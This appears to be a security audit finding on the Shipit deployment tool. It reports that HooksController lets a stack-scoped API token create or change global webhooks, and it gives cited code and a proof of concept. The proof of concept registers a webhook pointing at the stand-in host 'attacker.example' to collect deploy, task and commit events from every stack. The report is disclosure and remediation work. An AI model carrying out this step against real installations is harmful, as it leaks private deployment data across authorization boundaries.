### Title
Stack-scoped API tokens can create/manage global webhooks affecting all stacks - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
`Shipit::Api::HooksController` derives the `stack_id` used to scope hook records solely from the presence of a `stack_id` request *parameter*, not from the identity/scope actually bound to the authenticated `ApiClient`. A `write:hook`/`read:hook` permission check only verifies the operation name against the client's `permissions` array; it never checks whether the client is restricted to a single stack (`ApiClient#stack_id`). Because the engine mounts both a stack-scoped hooks route and a top-level, unscoped hooks route to the same controller, any `ApiClient` created with a `stack_id` (i.e., meant to only see/manage one stack) and the `write:hook`/`read:hook` permission can simply call the unscoped route (`/api/hooks`) to read, create, update or delete **global** hooks, which receive delivery events for every stack in the installation.

### Finding Description
`ApiClient` supports being scoped to a single stack via `belongs_to :stack, optional: true`, and `BaseController#stacks` is supposed to enforce this scoping: [1](#0-0) 

However `HooksController` bypasses this `stacks`/`stack` scoping mechanism entirely and implements its own ad-hoc scoping based only on whether the `stack_id` route/query parameter is present: [2](#0-1) 

The permission gate only checks the operation string against `ApiClient#permissions`, never against `ApiClient#stack_id`: [3](#0-2) [4](#0-3) 

The routing table mounts the same `HooksController` both scoped under a stack and completely unscoped at the API root: [5](#0-4) 

When hit via the unscoped route (e.g. `POST /api/hooks`), `params[:stack_id]` is absent, so `HooksController#stack_id` returns `nil`, and `hooks` resolves to `Hook.where(stack_id: nil)` — the set of **global** hooks: [6](#0-5) 

Global hooks (`stack_id: nil`) receive delivery events for every stack, because `Hook.deliver` always includes global hooks regardless of which stack emitted the event: [7](#0-6) 

The binding that should hold is: `ApiClient.stack_id (the single stack the token authorizes)` == `Hook#stack_id (the stack the created/read/mutated hook actually touches)`. In `HooksController`, this equality is never enforced — the controller only asks "does the request URL include a `stack_id` param?", not "is this API client restricted to that stack, and if so, is it forbidden from touching hooks whose `stack_id` differs (including the global `nil` scope)?" The existing test suite even documents the unscoped route as legitimate default behavior without checking client stack-scoping: `Hook.global.first` is freely read/written by `authenticate!` (the default `:spy` client) in `test/controllers/api/hooks_controller_test.rb`, without any test asserting that a stack-scoped client is blocked from the global route.

### Impact Explanation
An `ApiClient` provisioned by an admin to manage a single stack's own webhooks (`write:hook` permission, `stack_id` set to Stack A) can instead call `POST /api/hooks` (the unscoped route) to create a brand-new **global** webhook pointing to an attacker-controlled URL, subscribed to any of `Hook::EVENTS` (`stack`, `deploy`, `task`, `commit_status`, `pull_request`, etc.). Because `Hook.deliver` always dispatches to hooks scoped `nil` in addition to the specific stack, this single token — originally trusted only with one stack — now silently receives delivery payloads for deploys, tasks, commits, and pull requests across **every stack in the Shipit installation**, not just the one it was authorized for. The same path also allows reading (`GET /api/hooks`), modifying, or deleting the existing global hook(s), which can disable organization-wide notification/automation infrastructure. This is a cross-repository/cross-stack authorization boundary break, matching the "unauthenticated read of stack state, task streams or deploy output" High-severity class, since it grants a narrowly-scoped credential visibility into (and control over) data streams belonging to stacks/repositories it was never granted access to.

### Likelihood Explanation
Exploitation only requires possession of a legitimately-issued, stack-scoped `ApiClient` token with `read:hook` or `write:hook` permission (a token an unprivileged automation/integration might reasonably hold for its own stack) and knowledge that the unscoped `/api/hooks` route exists and maps to the same controller — this route is present in the public routing table (`config/routes.rb`) and requires no additional privilege beyond the already-issued token. No signature forgery, session, or additional credentials are needed beyond the single-stack token that is the premise of the "stack a token authorises vs. a stack it touches" bug class.

### Recommendation
`HooksController` (and any similarly dual-mounted controller) should reuse the same `stacks`/`stack` scoping helpers already defined in `BaseController`, and should explicitly reject (403/404) any request to the unscoped/global hook routes when `current_api_client.stack_id?` is true. Concretely, `hooks`/`stack_id` in `HooksController` should be derived from `current_api_client.stack_id` when the client is stack-scoped, ignoring/overriding the raw `params[:stack_id]`, and the global routes should require an unscoped (`UnlimitedApiClient` or explicitly global) client.

### Proof of Concept
1. Admin creates an `ApiClient` with `stack_id: <Stack A>.id` and `permissions: ['write:hook']`, intending it to manage only Stack A's webhooks (see `app/controllers/shipit/ccmenu_url_controller.rb` for an example of how scoped clients are provisioned, and `ApiClient#stack_id` in `app/models/shipit/api_client.rb`).
2. Using this token's Basic-Auth credentials, attacker calls `POST /api/hooks` (note: **not** `/api/stacks/*stack_id/hooks`) with `{ delivery_url: 'https://attacker.example/collect', events: ['deploy', 'task', 'commit_status'] }`.
3. `HooksController#stack_id` returns `nil` because `params[:stack_id]` is absent (`app/controllers/shipit/api/hooks_controller.rb:50-52`), so `hooks.create(params)` creates a record with `stack_id: nil`.
4. From this point, `Hook.deliver` (`app/models/shipit/hook.rb:115-119`) sends every subsequent `deploy`, `task`, and `commit_status` event, for every stack in the Shipit instance, to `https://attacker.example/collect` — even though the token was only ever authorized for Stack A.

### Citations

**File:** app/controllers/shipit/api/base_controller.rb (L74-80)
```ruby
      def stacks
        @stacks ||= current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all
      end

      def stack
        @stack ||= stacks.from_param!(params[:stack_id])
      end
```

**File:** app/controllers/shipit/api/base_controller.rb (L82-84)
```ruby
      def require_permission!(operation, scope)
        current_api_client.check_permissions!(operation, scope)
      end
```

**File:** app/controllers/shipit/api/hooks_controller.rb (L40-52)
```ruby
      private

      def hook
        hooks.find(params[:id])
      end

      def hooks
        Hook.where(stack_id:)
      end

      def stack_id
        stack.id if params[:stack_id].present?
      end
```

**File:** app/models/shipit/api_client.rb (L38-45)
```ruby
    def check_permissions!(operation, scope)
      required_permission = "#{operation}:#{scope}"
      unless permissions.include?(required_permission)
        raise InsufficientPermission, "This operation requires the `#{required_permission}` permission"
      end

      true
    end
```

**File:** config/routes.rb (L27-46)
```ruby
    scope '/stacks/*stack_id', stack_id: stack_id_format, as: :stack do
      get '/ccmenu' => 'ccmenu#show', as: :ccmenu
      resource :lock, only: %i[create update destroy]
      resources :tasks, only: %i[index show] do
        resource :output, only: :show
        member do
          put :abort
        end
      end
      resources :deploys, only: %i[index create] do
        resources :release_statuses, only: %i[create]
      end
      resources :rollbacks, only: %i[create]
      resources :commits, only: %i[index]
      resources :merge_requests, only: %i[index show update destroy]
      post '/task/:task_name' => 'tasks#trigger', as: :trigger_task
      resources :hooks, only: %i[index create show update destroy]
    end

    resources :hooks, only: %i[index create show update destroy]
```

**File:** app/models/shipit/hook.rb (L93-95)
```ruby
    scope :global, -> { where(stack_id: nil) }
    scope :scoped_to, ->(stack) { where(stack_id: stack.id) }
    scope :for_stack, ->(stack_id) { where(stack_id: [nil, stack_id]) }
```

**File:** app/models/shipit/hook.rb (L115-119)
```ruby
      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
```
